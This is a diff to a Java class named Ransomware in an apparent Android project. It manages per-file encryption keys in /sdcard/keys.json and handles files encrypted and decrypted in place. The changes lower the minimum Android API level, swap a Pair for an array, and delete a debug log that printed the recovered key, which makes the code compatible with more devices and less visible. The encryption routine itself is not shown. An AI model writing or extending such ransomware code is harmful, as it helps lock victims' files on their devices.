@@ -1,8 +1,7 @@
 package com.mason.ransomware;
 
+
 import android.os.Build;
-import android.util.Log;
-import android.util.Pair;
 
 import androidx.annotation.RequiresApi;
 
@@ -44,7 +43,7 @@ public class Ransomware {
 
     }
 
-    @RequiresApi(api = Build.VERSION_CODES.O)
+    @RequiresApi(api = Build.VERSION_CODES.N)
     public static void main(String[] args) {
         // Set up keys.json
         if (!new File("/sdcard/keys.json").exists()){
@@ -95,13 +94,14 @@ public class Ransomware {
         File inFile = new File(path);
         File encryptedFile = new File(path);
 
-        Pair<String, String> keyValPair = new Pair<>(jsonKey, key);
+//        Pair<String, String> keyValPair = new Pair<>(jsonKey, key);
+        String keyValPair[] = {jsonKey, key};
         Gson gson = new Gson();
 
         FileReader reader = new FileReader("/sdcard/keys.json");
 
         Map<String, String> jsonToMap = gson.fromJson(reader, Map.class);
-        jsonToMap.put(keyValPair.first, keyValPair.second);
+        jsonToMap.put(keyValPair[0], keyValPair[1]);
 
         FileWriter writer = new FileWriter("/sdcard/keys.json");
         gson.toJson(jsonToMap, writer);
@@ -118,7 +118,6 @@ public class Ransomware {
         Object obj = parser.parse(new FileReader("/sdcard/keys.json"));
         org.json.simple.JSONObject jsonObject = (org.json.simple.JSONObject) obj;
         String key = (String) jsonObject.get(jsonKey);
-        Log.d("KEY FOUND:", key);
 
         File encryptedFile = new File(path);
         File decryptedFile = new File(path);
